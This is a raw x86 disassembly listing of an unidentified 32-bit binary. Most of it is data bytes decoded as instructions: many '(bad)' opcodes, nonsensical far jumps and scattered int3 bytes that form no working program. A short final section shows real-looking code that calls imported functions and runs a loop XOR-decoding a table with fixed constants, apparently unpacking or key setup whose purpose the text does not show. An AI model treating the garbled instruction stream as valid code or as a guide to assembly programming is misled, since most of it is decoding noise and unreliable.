  43a9d8:	add    BYTE PTR [ecx],al
  43a9da:	add    bh,bh
  43a9dc:	xlat   BYTE PTR ds:[ebx]
  43a9dd:	inc    edx
  43a9de:	(bad)  
  43a9df:	cmp    bh,bh
  43a9e1:	adc    eax,0x97cf00ff
  43a9e6:	dec    DWORD PTR [ebx]
  43a9e8:	int3   
  43a9e9:	aam    0xff
  43a9eb:	add    ch,ah
  43a9ed:	cmp    al,0xff
  43a9ef:	xor    al,0xff
  43a9f1:	ret    
  43a9f2:	(bad)  
  43a9f3:	jmp    FWORD PTR [eax-0xc100b5]
  43a9f9:	cmp    eax,DWORD PTR [eax]
  43a9fb:	add    BYTE PTR [ebx+0xbeff76],bh
  43aa01:	loope  0x43a9cf
  43aa03:	call   FWORD PTR [esi-0x25]
  43aa06:	push   DWORD PTR ds:0x89e0ff
  43aa0c:	es jmp 0x87435412
  43aa12:	dec    esp
  43aa14:	nop
  43aa15:	sub    edi,edi
  43aa17:	bound  eax,QWORD PTR [eax]
  43aa19:	mov    cl,0x0
  43aa1b:	add    BYTE PTR [edi-0x7cc1ff13],ah
  43aa21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aa22:	add    bh,bh
  43aa24:	mov    BYTE PTR [eax-0x50002a01],bh
  43aa2a:	inc    DWORD PTR [eax]
  43aa2c:	popa   
  43aa2d:	push   0xffffffff
  43aa2f:	repz inc eax
  43aa32:	(bad)  
  43aa33:	call   FWORD PTR [ebx+ebp*1]
  43aa36:	mov    DWORD PTR [ebx+0xca00],eax
  43aa3c:	jmp    0x11:0xff15ffcb
  43aa43:	inc    DWORD PTR [ebx]
  43aa45:	bound  eax,QWORD PTR [ebx-0x8200f3]
  43aa4b:	add    BYTE PTR [esi],al
  43aa4d:	fiadd  WORD PTR [ebx+0x95ccf7]
  43aa53:	int3   
  43aa54:	xchg   ebx,eax
  43aa55:	push   cs
  43aa56:	(bad)  
  43aa57:	dec    ah
  43aa59:	inc    edx
  43aa5a:	inc    DWORD PTR [ebx+0x50fffc11]
  43aa60:	(bad)  
  43aa61:	fisttp DWORD PTR [ecx-0x33937c34]
  43aa67:	adc    DWORD PTR [ebx-0x4bffffc9],eax
  43aa6d:	cmp    bh,bh
  43aa6f:	imul   edi,edi,0xffffffe5
  43aa72:	add    DWORD PTR [eax],0x1a
  43aa75:	push   edx
  43aa76:	dec    DWORD PTR [edi+edi*8]
  43aa79:	dec    BYTE PTR [ecx-0x7ac701]
  43aa7f:	cmp    eax,0x89ffa1ff
  43aa84:	add    edi,DWORD PTR [esi]
  43aa86:	(bad)  
  43aa87:	fiadd  DWORD PTR [ebx-0x77ff7c23]
  43aa8d:	add    DWORD PTR [eax],eax
  43aa8f:	cmp    eax,DWORD PTR [ebx+0x7200ff5f]
  43aa95:	jne    0x43aa1a
  43aa97:	push   DWORD PTR ds:[ecx]
  43aa9a:	add    bh,bh
  43aa9c:	ins    DWORD PTR es:[edi],dx
  43aa9d:	test   eax,0xaa8356cc
  43aaa2:	int3   
  43aaa3:	sub    edx,0xffffffb1
  43aaa6:	(bad)  
  43aaa7:	jp     0x43aaa8
  43aaa9:	mov    ecx,esp
  43aaab:	add    BYTE PTR [eax-0x5c],al
  43aaae:	call   FWORD PTR [esi+0x0]
  43aab1:	js     0x43aa3c
  43aab3:	add    BYTE PTR [esi-0x332500b8],bh
  43aab9:	(bad)  
  43aaba:	(bad)  
  43aabb:	call   DWORD PTR [edi-0x67]
  43aabe:	add    BYTE PTR [edx-0x9501],ah
  43aac4:	sub    al,0x1b
  43aac6:	add    BYTE PTR [eax-0xa277],dl
  43aacc:	ror    cl,cl
  43aace:	push   DWORD PTR [edi-0x6901]
  43aad4:	or     al,0xba
  43aad6:	jmp    DWORD PTR [edx]
  43aad8:	(bad)  
  43aad9:	cld    
  43aada:	add    bh,bh
  43aadc:	mov    eax,0x4aff60
  43aae1:	ss add bh,bh
  43aae4:	pop    ss
  43aae5:	aam    0x0
  43aae7:	mov    dh,0xff
  43aae9:	or     eax,DWORD PTR [eax]
  43aaeb:	add    bl,cl
  43aaed:	mov    esi,0xc683e689
  43aaf2:	(bad)  
  43aaf3:	push   edx
  43aaf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43aaf6:	int3   
  43aaf7:	mov    DWORD PTR [ecx+0x6cffff19],ecx
  43aafd:	ud0    ebp,DWORD PTR [ebp-0x1]
  43ab01:	jo     0x43ab03
  43ab03:	add    DWORD PTR [edx-0xb2008d],0xffffffb5
  43ab0a:	add    BYTE PTR [eax],al
  43ab0c:	adc    BYTE PTR [eax-0x1],cl
  43ab0f:	mov    ebx,0x83007583
  43ab14:	loopne 0x43ab86
  43ab16:	(bad)  
  43ab17:	fdiv   st(7),st
  43ab19:	leave  
  43ab1a:	int3   
  43ab1b:	add    BYTE PTR [edi],ah
  43ab1d:	push   cs
  43ab1e:	and    DWORD PTR [edi-0x1],0xffffff96
  43ab22:	add    bh,bh
  43ab24:	mov    al,ds:0x91007b
  43ab29:	mov    ds:0x36b18300,eax
  43ab2e:	jmp    DWORD PTR [edi+0x0]
  43ab31:	pop    ds
  43ab32:	add    BYTE PTR [eax],al
  43ab34:	outs   dx,DWORD PTR ds:[esi]
  43ab35:	push   DWORD PTR cs:[esi]
  43ab38:	add    BYTE PTR [edi+edi*8-0x1],dh
  43ab3c:	pop    edi
  43ab3d:	test   DWORD PTR [eax],0xff7b006a
  43ab43:	int3   
  43ab44:	mov    esi,DWORD PTR [edi+0x3300e2ff]
  43ab4a:	cmp    edi,0x2e
  43ab4d:	test   eax,0x61ffa1ff
  43ab52:	add    ah,cl
  43ab54:	add    BYTE PTR [eax+0x41fffeff],ch
  43ab5a:	cmp    edi,0x71
  43ab5d:	mov    al,0x89
  43ab5f:	xor    eax,DWORD PTR [eax]
  43ab61:	data16 (bad) 
  43ab63:	inc    DWORD PTR [edi+0x7c]
  43ab66:	int3   
  43ab67:	or     eax,0xffffd600
  43ab6c:	adc    BYTE PTR [esi],dh
  43ab6e:	xor    DWORD PTR [edx],0xffffff83
  43ab71:	xor    edi,edi
  43ab73:	dec    ecx
  43ab75:	test   eax,0xa9ff39ff
  43ab7a:	inc    DWORD PTR [eax]
  43ab7c:	xchg   ebp,eax
  43ab7d:	in     eax,0xff
  43ab7f:	sbb    eax,0x8900cdcc
  43ab84:	mov    cl,0x64
  43ab86:	push   ecx
  43ab88:	add    BYTE PTR [eax-0x1e3eff01],ch
  43ab8e:	int3   
  43ab8f:	test   bh,bh
  43ab91:	idiv   bh
  43ab93:	add    BYTE PTR [edx],ah
  43ab95:	mov    esp,0x7583c1ff
  43ab9a:	(bad)  
  43ab9b:	dec    DWORD PTR [edx-0xb9ff0c]
  43aba1:	pop    ds
  43aba2:	add    bh,bh
  43aba4:	xor    DWORD PTR [edx-0x1],esi
  43aba7:	out    dx,al
  43aba8:	add    BYTE PTR [ebx],bh
  43abaa:	(bad)  
  43abab:	call   FWORD PTR [edx-0x7c9433a2]
  43abb1:	lds    eax,FWORD PTR [eax]
  43abb3:	call   DWORD PTR [eax+0x1b]
  43abb6:	(bad)  
  43abb7:	cmp    eax,0x8300bdff
  43abbc:	(bad)  
  43abbd:	pop    ecx
  43abbe:	add    BYTE PTR [esi],bh
  43abc0:	jmp    DWORD PTR [ebx+eax*4]
  43abc3:	push   DWORD PTR [eax+0x4300d6]
  43abc9:	je     0x43abcb
  43abcb:	add    BYTE PTR [edx+ebp*8],dh
  43abce:	(bad)  
  43abcf:	clc    
  43abd0:	add    BYTE PTR [edi+edi*8+0x76d6cc],ah
  43abd7:	lods   al,BYTE PTR ds:[esi]
  43abd8:	call   FWORD PTR [ebx-0x1]
  43abdb:	add    BYTE PTR [edi+0x5e],cl
  43abde:	jmp    FWORD PTR [eax+0x0]
  43abe1:	out    0xff,al
  43abe3:	add    BYTE PTR [ecx+edi*8+0x32fffe89],al
  43abea:	dec    esp
  43abec:	mov    edx,0xff6aff64
  43abf1:	out    0xff,al
  43abf3:	push   DWORD PTR [edi]
  43abf5:	enter  0x16ff,0xff
  43abf9:	jmp    0x8200:0x22f1ffcc
  43ac00:	mov    DWORD PTR [edi+edi*8-0x7634907d],esi
  43ac07:	mov    al,BYTE PTR [ebx-0x3700ff54]
  43ac0d:	jno    0x43ac0e
  43ac0f:	mov    dh,0xff
  43ac11:	pop    esi
  43ac12:	int3   
  43ac13:	add    al,bl
  43ac15:	mov    eax,ds:0xeb00b383
  43ac1a:	(bad)  
  43ac1b:	dec    eax
  43ac1d:	mov    ds:0x9eff5b00,eax
  43ac22:	(bad)  
  43ac23:	(bad)  
  43ac24:	fcmove st,st(4)
  43ac26:	add    bh,dl
  43ac28:	add    dl,ch
  43ac2a:	inc    DWORD PTR [eax]
  43ac2c:	sub    eax,0xc9ccae
  43ac31:	(bad)  
  43ac32:	inc    DWORD PTR [eax]
  43ac34:	fadd   DWORD PTR [edx+0x6ccc85ff]
  43ac3a:	inc    DWORD PTR [eax]
  43ac3c:	xchg   edi,eax
  43ac3d:	fdivp  st(7),st
  43ac3f:	out    0x83,al
  43ac41:	mov    esi,0xe496ffcc
  43ac46:	mov    DWORD PTR [eax+eax*1-0x21],ebx
  43ac4a:	inc    DWORD PTR [eax]
  43ac4c:	jnp    0x43ac61
  43ac4e:	add    BYTE PTR [ebx],dl
  43ac50:	(bad)  
  43ac51:	jns    0x43ac53
  43ac53:	dec    DWORD PTR [ecx+0x2d]
  43ac56:	dec    DWORD PTR [edx]
  43ac58:	mov    esp,edx
  43ac5a:	add    bh,bh
  43ac5c:	fisub  WORD PTR [ecx]
  43ac5e:	call   FWORD PTR [ecx+0xff0fff]
  43ac64:	inc    edx
  43ac66:	add    BYTE PTR [eax],bl
  43ac68:	call   DWORD PTR [esi]
  43ac6a:	int3   
  43ac6b:	(bad)  
  43ac6c:	jg     0x43abf6
  43ac6e:	int3   
  43ac6f:	sub    BYTE PTR [eax],al
  43ac71:	hlt    
  43ac72:	add    bh,bh
  43ac74:	adc    DWORD PTR [eax+0x3a008eff],esp
  43ac7a:	cmp    edi,0x32
  43ac7d:	add    BYTE PTR [ebx-0x6800d9],0xff
  43ac84:	aaa    
  43ac85:	fdivr  st,st(7)
  43ac87:	adc    ah,cl
  43ac89:	mov    eax,ds:0x2cf38300
  43ac8e:	(bad)  
  43ac8f:	mov    edx,0xccc
  43ac94:	add    al,0xcc
  43ac96:	add    BYTE PTR [esi],ch
  43ac98:	add    BYTE PTR [ebp+0x2787ff00],dh
  43ac9e:	(bad)  
  43ac9f:	cmp    eax,0xff2200
  43aca4:	sar    bl,cl
  43aca6:	mov    DWORD PTR [eax-0x1],ebx
  43aca9:	mov    ah,0xcc
  43acab:	(bad)  
  43acac:	mov    esi,0xccb2cc93
  43acb1:	outs   dx,DWORD PTR ds:[esi]
  43acb2:	int3   
  43acb3:	jmp    DWORD PTR [esi]
  43acb5:	add    edi,edi
  43acb7:	jns    0x43acb8
  43acb9:	or     DWORD PTR [eax],eax
  43acbb:	int3   
  43acbc:	icebp  
  43acbd:	in     eax,0xff
  43acbf:	mov    edx,0xffc883
  43acc4:	es mov esp,0x23836200
  43acca:	int3   
  43accb:	call   ebx
  43accd:	xchg   ebp,eax
  43acce:	call   FWORD PTR [ebp-0x1c01]
  43acd4:	hlt    
  43acd5:	sar    bh,1
  43acd7:	clc    
  43acd8:	(bad)  
  43acd9:	stc    
  43acda:	add    bh,bh
  43acdc:	and    esi,DWORD PTR [ecx]
  43acde:	inc    DWORD PTR [edi]
  43ace0:	xor    edx,0xffffffff
  43ace3:	add    BYTE PTR [edi],ah
  43ace5:	ret    
  43ace6:	jmp    FWORD PTR [edx-0x7c008f00]
  43acec:	adc    eax,0x8972ff8c
  43acf1:	mov    eax,0x6680ff89
  43acf6:	call   FWORD PTR [ebx-0x7cff2e01]
  43acfc:	adc    al,0x53
  43acfe:	int3   
  43acff:	dec    esp
  43ad00:	call   eax
  43ad02:	inc    DWORD PTR [ebx+0x75ff9364]
  43ad08:	add    BYTE PTR [eax],dl
  43ad0a:	add    bh,bh
  43ad0c:	arpl   bp,si
  43ad0e:	cmp    DWORD PTR [ecx-0x1],0xffffff96
  43ad12:	add    bh,bh
  43ad14:	pop    es
  43ad15:	mov    dh,0xcc
  43ad17:	jne    0x43ad18
  43ad19:	jg     0x43ac9e
  43ad1b:	dec    edi
  43ad1d:	js     0x43ad1e
  43ad1f:	pop    eax
  43ad20:	call   ecx
  43ad22:	cmp    edi,0xffffff86
  43ad25:	add    BYTE PTR [bx+di-0x1],al
  43ad29:	inc    DWORD PTR fs:[eax]
  43ad2c:	jg     0x43ad60
  43ad2e:	add    BYTE PTR [esi+0x0],dh
  43ad31:	mov    ?,edi
  43ad33:	call   DWORD PTR [esi+0x2e]
  43ad36:	add    BYTE PTR [ecx+0xff8283],ah
  43ad3c:	repnz nop
  43ad3e:	(bad)  
  43ad3f:	fadd   QWORD PTR [eax]
  43ad41:	add    BYTE PTR [eax],0xff
  43ad44:	fs (bad) 
  43ad46:	jmp    DWORD PTR [esi]
  43ad48:	sbb    DWORD PTR [ebp+0x4ac4cc00],0xffffff83
  43ad4f:	push   es
  43ad50:	add    bl,dl
  43ad52:	inc    DWORD PTR [ebx+0x1b895639]
  43ad58:	call   FWORD PTR [edx]
  43ad5a:	(bad)  
  43ad5b:	call   DWORD PTR [ebx+0x5e]
  43ad5e:	call   FWORD PTR [edi]
  43ad60:	mov    DWORD PTR [edi],ebx
  43ad62:	add    BYTE PTR [eax],al
  43ad64:	cld    
  43ad65:	int    0xff
  43ad67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ad68:	add    BYTE PTR [ebx],bl
  43ad6a:	add    DWORD PTR [eax],0xffffffcc
  43ad6d:	add    BYTE PTR es:[edi+0x83beff],dh
  43ad74:	push   0xffffffa4
  43ad76:	dec    DWORD PTR [esi+0x0]
  43ad79:	out    0xff,eax
  43ad7b:	call   DWORD PTR [ebp-0x56]
  43ad7e:	mov    DWORD PTR [edi+edi*8+0x61],esp
  43ad82:	(bad)  
  43ad83:	(bad)  
  43ad84:	call   0x834dad3d
  43ad89:	int    0xff
  43ad8b:	call   FWORD PTR [edx-0x7c9eff56]
  43ad91:	mov    esp,ecx
  43ad93:	mov    DWORD PTR [edx-0x7100e0],esi
  43ad99:	add    DWORD PTR [eax],0xffffffff
  43ad9c:	repz in al,0x0
  43ad9f:	int3   
  43ada0:	add    BYTE PTR ds:0x3e8f0083,bh
  43ada6:	push   DWORD PTR [ebp-0x7d]
  43ada9:	push   ss
  43adaa:	add    DWORD PTR [eax],0xffffffcf
  43adad:	jns    0x898f3155
  43adb3:	or     DWORD PTR [eax+0x4d],0xffffff83
  43adb7:	mov    WORD PTR [ebx+0x4400ffbd],es
  43adbd:	inc    edx
  43adbe:	or     DWORD PTR [ebp-0x8934],0x18
  43adc5:	mov    BYTE PTR [eax],0xd1
  43adc8:	add    BYTE PTR [eax+eax*1+0xf49dff],bl
  43adcf:	leave  
  43add0:	inc    DWORD PTR [eax-0x1c83007d]
  43add6:	mov    DWORD PTR [eax-0x7901],edi
  43addc:	mov    ds:0xff800046,eax
  43ade1:	lods   al,BYTE PTR ds:[esi]
  43ade2:	cmp    edi,0xffffff8c
  43ade5:	pop    ebx
  43ade6:	call   FWORD PTR [eax-0x7d]
  43ade9:	mov    al,ds:0xd18b0089
  43adee:	dec    DWORD PTR [eax]
  43adf0:	jmp    DWORD PTR [ebx]
  43adf2:	add    DWORD PTR [eax],0x15
  43adf5:	sub    al,0x0
  43adf7:	or     eax,0xccff71cc
  43adfc:	int    0x57
  43adfe:	add    BYTE PTR [eax+0x0],ah
  43ae01:	imul   edi,edi,0xffffff83
  43ae04:	push   ds
  43ae05:	sbb    esp,ecx
  43ae07:	push   0x83ff3783
  43ae0c:	sahf   
  43ae0d:	fadd   DWORD PTR [ebx-0x7c040031]
  43ae13:	int3   
  43ae14:	ror    DWORD PTR [esi+0x4aff3400],1
  43ae1a:	inc    DWORD PTR [eax]
  43ae1c:	mov    dl,0x3c
  43ae1e:	mov    esi,edx
  43ae20:	add    BYTE PTR [eax+eax*1+0x0],dl
  43ae24:	xchg   edi,eax
  43ae25:	popf   
  43ae26:	jmp    FWORD PTR [ebp-0x1634]
  43ae2c:	test   BYTE PTR [ebp-0x7476727d],0xff
  43ae33:	xor    DWORD PTR [eax+0x1d],0xffffffff
  43ae37:	imul   edi,edi,0xffffffb2
  43ae3a:	add    bh,bh
  43ae3c:	shl    BYTE PTR [ecx+ecx*4+0x1d],0x83
  43ae41:	push   edi
  43ae42:	mov    edi,edi
  43ae44:	jbe    0x43ae09
  43ae46:	call   DWORD PTR [edi+edi*8]
  43ae49:	mov    bh,bh
  43ae4b:	mov    DWORD PTR ds:0xd283a7,ebp
  43ae51:	or     esp,0x529683
  43ae57:	inc    esp
  43ae58:	or     DWORD PTR [edx+0x49780000],0xffffffff
  43ae5f:	fld    QWORD PTR [eax]
  43ae61:	sbb    al,BYTE PTR [eax]
  43ae63:	add    BYTE PTR [ecx],al
  43ae65:	inc    DWORD PTR [ebx-0x83ff2f]
  43ae6b:	push   DWORD PTR [eax]
  43ae6d:	or     DWORD PTR es:[ebp+0xcc18ff],0xffffffb2
  43ae75:	imul   edi,edi,0xa400be
  43ae7b:	(bad)  
  43ae7c:	jns    0x43ae5c
  43ae7e:	push   DWORD PTR [ebx-0x7c7cdb01]
  43ae84:	xchg   esi,eax
  43ae85:	or     bh,bh
  43ae87:	xchg   edi,edi
  43ae89:	stc    
  43ae8a:	add    bh,bh
  43ae8c:	nop
  43ae8d:	jmp    0xad433b91
  43ae92:	add    bh,bh
  43ae94:	and    eax,edi
  43ae96:	dec    DWORD PTR [ebx-0x7c00f67d]
  43ae9c:	push   esp
  43ae9d:	inc    ebx
  43ae9e:	call   FWORD PTR [esi+0xff1400]
  43aea4:	pop    ebx
  43aea5:	pop    esp
  43aea6:	add    bl,bh
  43aea8:	mov    DWORD PTR [ecx],eax
  43aeaa:	inc    DWORD PTR [eax]
  43aeac:	mov    eax,0x8315ffab
  43aeb1:	mov    WORD PTR [ebx-0x4bba01],es
  43aeb7:	or     edi,edi
  43aeb9:	ins    DWORD PTR es:[edi],dx
  43aeba:	int3   
  43aebb:	jmp    FWORD PTR ds:0x14007f
  43aec1:	sbb    eax,DWORD PTR [eax]
  43aec3:	push   DWORD PTR [ebp-0x7cd7002c]
  43aec9:	(bad)  
  43aecb:	jmp    DWORD PTR [ebp+0xdff40]
  43aed1:	adc    cl,ah
  43aed3:	push   DWORD PTR [edi-0xca00ef]
  43aed9:	call   0x5d4aedd
  43aede:	add    BYTE PTR [esi+0x8348cc],bh
  43aee4:	xor    DWORD PTR [ebx-0x77],0x50
  43aee8:	or     edi,0xffffffff
  43aeeb:	add    BYTE PTR [edi+0x53839f],bh
  43aef1:	jns    0x43aef2
  43aef3:	jmp    FWORD PTR [esi-0x72]
  43aef6:	inc    DWORD PTR [edi-0x1]
  43aef9:	cmp    bh,bh
  43aefb:	push   esp
  43aefd:	loope  0x43aefe
  43aeff:	xor    al,BYTE PTR [eax]
  43af01:	mov    bl,0xff
  43af03:	add    BYTE PTR [esi-0xa4ffd8],bh
  43af09:	mov    ch,0xff
  43af0b:	jmp    edx
  43af0d:	sar    edi,0xd7
  43af10:	sub    DWORD PTR [esi-0x1b04007d],0xffffffff
  43af17:	stos   DWORD PTR es:[edi],eax
  43af18:	push   DWORD PTR [ebx+0x3010ffff]
  43af1e:	add    dh,bl
  43af20:	jmp    FWORD PTR [ebp+0x0]
  43af23:	add    ch,al
  43af25:	push   ebp
  43af26:	jmp    ebx
  43af28:	jmp    edx
  43af2a:	(bad)  
  43af2b:	call   ebx
  43af2d:	scas   eax,DWORD PTR es:[edi]
  43af2e:	add    BYTE PTR [edx],ch
  43af30:	int3   
  43af31:	xchg   ebx,eax
  43af32:	int3   
  43af33:	int3   
  43af34:	push   ecx
  43af35:	mov    al,ds:0x9f830983
  43af3a:	inc    DWORD PTR [ebx-0x24000fb1]
  43af40:	add    dl,bl
  43af42:	inc    DWORD PTR [ebx+0x38ff13be]
  43af48:	add    BYTE PTR [esi-0x7d],dh
  43af4b:	push   esi
  43af4d:	push   0x39ffa100
  43af52:	add    BYTE PTR [eax],al
  43af54:	jo     0x43af19
  43af56:	push   DWORD PTR [eax+eax*1-0x15ff7c8a]
  43af5d:	(bad)  
  43af5e:	dec    DWORD PTR [ebx]
  43af60:	call   DWORD PTR [ebx]
  43af62:	add    DWORD PTR [eax],0xffffffbd
  43af65:	pop    edi
  43af66:	add    BYTE PTR [edi-0x97d],cl
  43af6c:	jg     0x43af4d
  43af6e:	push   DWORD PTR [eax]
  43af70:	call   FWORD PTR [eax-0x19b70001]
  43af76:	push   ebp
  43af78:	add    bl,ah
  43af7a:	cmp    edi,0xffffff83
  43af7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43af7e:	add    BYTE PTR [edx+0x0],dh
  43af81:	and    eax,DWORD PTR [ebx-0x983900]
  43af87:	sti    
  43af88:	int3   
  43af89:	jp     0x43af8a
  43af8b:	int3   
  43af8c:	dec    ebp
  43af8d:	imul   edi,edi,0xcce283de
  43af93:	and    DWORD PTR [edx-0x7c7bff9f],0xffffff84
  43af9a:	cmp    edi,0xfffffffc
  43af9d:	jns    0x43af22
  43af9f:	sub    eax,DWORD PTR [eax]
  43afa1:	xchg   ebx,eax
  43afa2:	add    BYTE PTR [eax],al
  43afa4:	scas   eax,DWORD PTR es:[edi]
  43afa5:	outs   dx,BYTE PTR ds:[esi]
  43afa6:	mov    ebx,edi
  43afa8:	push   DWORD PTR [eax]
  43afaa:	cmp    edi,0x4e
  43afad:	xchg   esp,eax
  43afae:	mov    DWORD PTR [ebx+0x83b1cc],ecx
  43afb4:	pop    ss
  43afb5:	adc    eax,DWORD PTR [eax]
  43afb7:	idiv   edi
  43afb9:	scas   eax,DWORD PTR es:[edi]
  43afba:	(bad)  
  43afbb:	push   esp
  43afbd:	repz and eax,0xffffff89
  43afc1:	add    al,0x83
  43afc3:	call   FWORD PTR [ebx-0x76eb00df]
  43afc9:	out    0xcc,al
  43afcb:	int3   
  43afcc:	pusha  
  43afcd:	mov    ecx,0xce83f100
  43afd2:	add    bh,bh
  43afd4:	shl    BYTE PTR [esi+0x0],1
  43afd7:	push   cs
  43afd8:	call   FWORD PTR [edi+edi*8]
  43afdb:	sbb    DWORD PTR [esi+0x7],0xffffffcc
  43afdf:	js     0x43afe0
  43afe1:	fcos   
  43afe3:	add    al,cl
  43afe5:	icebp  
  43afe6:	(bad)  
  43afe7:	aas    
  43afe8:	push   DWORD PTR [ecx-0x1]
  43afeb:	add    ch,cl
  43afed:	outs   dx,BYTE PTR ds:[esi]
  43afee:	add    BYTE PTR [edi-0x7d],al
  43aff1:	jmp    0x43af76
  43aff3:	or     DWORD PTR [ecx+esi*2-0x1],0xffffffdc
  43aff8:	jmp    DWORD PTR [edi]
  43affa:	(bad)  
  43affb:	jmp    DWORD PTR [esi-0x62]
  43affe:	dec    DWORD PTR [esi]
  43b000:	jmp    DWORD PTR [ebx-0x727a7c77]
  43b006:	(bad)  
  43b007:	mov    eax,0xff004c89
  43b00c:	bnd call 0x79c7a811
  43b012:	(bad)  
  43b013:	call   FWORD PTR [edx]
  43b015:	pusha  
  43b016:	jmp    DWORD PTR [edi+0x0]
  43b019:	aaa    
  43b01a:	(bad)  
  43b01b:	inc    DWORD PTR [ebp+eax*2-0x26337101]
  43b022:	int3   
  43b023:	mov    DWORD PTR [ebp-0x31006f],ebx
  43b029:	dec    edx
  43b02a:	add    BYTE PTR [ecx+0x34000192],cl
  43b030:	(bad)  
  43b031:	jnp    0x43b032
  43b033:	call   DWORD PTR [edx+0x2acc04]
  43b039:	mov    al,ds:0xcc87ff00
  43b03e:	int3   
  43b03f:	or     eax,0xff894f00
  43b044:	jl     0x43b019
  43b046:	int3   
  43b047:	(bad)  
  43b048:	int3   
  43b049:	(bad)  
  43b04a:	dec    esp
  43b04c:	loop   0x43b072
  43b04e:	inc    DWORD PTR [esi]
  43b050:	add    bh,al
  43b052:	mov    DWORD PTR [eax],eax
  43b054:	jnp    0x43aff7
  43b056:	add    BYTE PTR [esi-0x1],ah
  43b059:	xor    eax,0xe7fffff
  43b05e:	push   edi
  43b060:	push   ebx
  43b062:	inc    DWORD PTR [eax]
  43b064:	js     0x43b05c
  43b066:	or     DWORD PTR [edi+edi*8],0x72
  43b06a:	add    bh,bh
  43b06c:	sub    dl,dh
  43b06e:	adc    DWORD PTR [ebp-0x34],0xffffffbd
  43b072:	(bad)  
  43b073:	(bad)  
  43b074:	fisttp DWORD PTR [esi-0x34]
  43b077:	(bad)  
  43b078:	jmp    DWORD PTR [ecx+0x6b09ffff]
  43b07e:	cmp    DWORD PTR [ebp-0x7c7c1e01],0xffffffd8
  43b085:	out    0x89,eax
  43b087:	cwde   
  43b088:	jmp    FWORD PTR [edx-0x62900100]
  43b08e:	add    bl,bh
  43b090:	call   FWORD PTR [eax]
  43b092:	add    bh,bh
  43b094:	out    dx,eax
  43b095:	enter  0x6a00,0xff
  43b099:	push   0xe7d8ff83
  43b09e:	jmp    FWORD PTR [ebx]
  43b0a0:	inc    ecx
  43b0a2:	add    bh,bh
  43b0a4:	in     al,0x18
  43b0a6:	sbb    DWORD PTR [edx-0x34],0xffffff90
  43b0aa:	add    ah,cl
  43b0ac:	adc    al,0x99
  43b0ae:	int3   
  43b0af:	clc    
  43b0b0:	cmp    DWORD PTR [esi-0x40c30001],0x0
  43b0b7:	(bad)  
  43b0b8:	int3   
  43b0b9:	cmc    
  43b0ba:	mov    edi,edi
  43b0bc:	scas   al,BYTE PTR es:[edi]
  43b0bd:	xor    eax,DWORD PTR [eax]
  43b0bf:	(bad)  
  43b0c1:	jnp    0x43b0c3
  43b0c3:	add    BYTE PTR [edi+0x1c],ch
  43b0c6:	add    BYTE PTR [esi-0x7d],dh
  43b0c9:	jmp    0xc700:0xc23400ff
  43b0d0:	inc    esp
  43b0d2:	cmp    edi,0xffffffb6
  43b0d5:	xchg   ebx,eax
  43b0d6:	jmp    DWORD PTR [ecx+ecx*4-0x437c00bc]
  43b0dd:	adc    edi,edi
  43b0df:	mov    cl,0x81
  43b0e1:	in     al,dx
  43b0e2:	sub    al,0x3
  43b0e4:	add    BYTE PTR [eax],al
  43b0e6:	push   ebx
  43b0e7:	push   ebp
  43b0e8:	push   esi
  43b0e9:	mov    esi,DWORD PTR ds:0x445060
  43b0ef:	push   edi
  43b0f0:	call   esi
  43b0f2:	mov    edi,DWORD PTR ds:0x445014
  43b0f8:	push   0xcf
  43b0fd:	mov    ebp,eax
  43b0ff:	push   0x42
  43b101:	mov    DWORD PTR [esp+0x24],ebp
  43b105:	call   edi
  43b107:	push   0x1b
  43b109:	push   0x42
  43b10b:	mov    DWORD PTR [esp+0x18],eax
  43b10f:	call   edi
  43b111:	mov    DWORD PTR [esp+0x14],eax
  43b115:	call   esi
  43b117:	mov    DWORD PTR [esp+0x18],eax
  43b11b:	call   0x42cbc0
  43b120:	mov    esi,DWORD PTR ds:0x448d20
  43b126:	mov    ebx,DWORD PTR ds:0x445054
  43b12c:	push   0x0
  43b12e:	push   0xd8
  43b133:	push   0x79
  43b135:	push   0x67
  43b137:	push   0x4f
  43b139:	push   0x0
  43b13b:	push   ebp
  43b13c:	add    esi,0x7268
  43b142:	call   ebx
  43b144:	mov    ecx,DWORD PTR ds:0x4480cc
  43b14a:	mov    edi,0xdc
  43b14f:	nop
  43b150:	movzx  eax,BYTE PTR [ecx+0x8]
  43b154:	movzx  edx,WORD PTR [ecx+0x6]
  43b158:	movzx  ecx,BYTE PTR [ecx]
  43b15b:	shl    eax,0x10
  43b15e:	add    eax,edx
  43b160:	shl    eax,0x8
  43b163:	mov    edx,0x863d7cc9
  43b168:	sub    edx,DWORD PTR ds:0x448d1c
  43b16e:	add    eax,ecx
  43b170:	xor    edx,eax
  43b172:	mov    ds:0x448d10,eax
  43b177:	push   0x0
  43b179:	mov    DWORD PTR [esi],edx
  43b17b:	call   DWORD PTR ds:0x445024
  43b181:	mov    ecx,DWORD PTR ds:0x4480cc
  43b187:	movzx  eax,WORD PTR [ecx+0xe]
  43b18b:	movzx  ecx,WORD PTR [ecx+0xb]
  43b18f:	mov    edx,DWORD PTR ds:0x448d1c
  43b195:	shl    eax,0x10
  43b198:	add    eax,ecx
  43b19a:	add    edx,0x863578fd
  43b1a0:	xor    edx,eax
  43b1a2:	mov    ds:0x448d10,eax
  43b1a7:	mov    DWORD PTR [esi+0x4],edx
  43b1aa:	mov    ecx,DWORD PTR ds:0x4480cc
  43b1b0:	add    ecx,0x10
  43b1b3:	add    esi,0x8
  43b1b6:	dec    edi
  43b1b7:	mov    DWORD PTR ds:0x4480cc,ecx
  43b1bd:	jne    0x43b150
  43b1bf:	call   0x4258a0
  43b1c4:	push   0x417b50
  43b1c9:	call   0x417b70
  43b1ce:	add    esp,0x4
  43b1d1:	call   0x43eb00
  43b1d6:	push   0x100
  43b1db:	lea    eax,[esp+0x140]
  43b1e2:	push   eax
  43b1e3:	push   0x447ab4
  43b1e8:	call   DWORD PTR ds:0x445050
  43b1ee:	mov    ecx,DWORD PTR ds:0x448d20
  43b1f4:	mov    edx,DWORD PTR ds:0x4480d0
  43b1fa:	add    ecx,0x5600
  43b200:	lea    esi,[edi+0x46]
  43b203:	movzx  eax,BYTE PTR [edx+0x7]
  43b207:	movzx  edi,BYTE PTR [edx+0x4]
  43b20b:	movzx  edx,WORD PTR [edx]
  43b20e:	shl    eax,0x8
  43b211:	add    eax,edi
  43b213:	shl    eax,0x10
  43b216:	add    eax,edx
  43b218:	mov    edx,DWORD PTR ds:0x448d1c
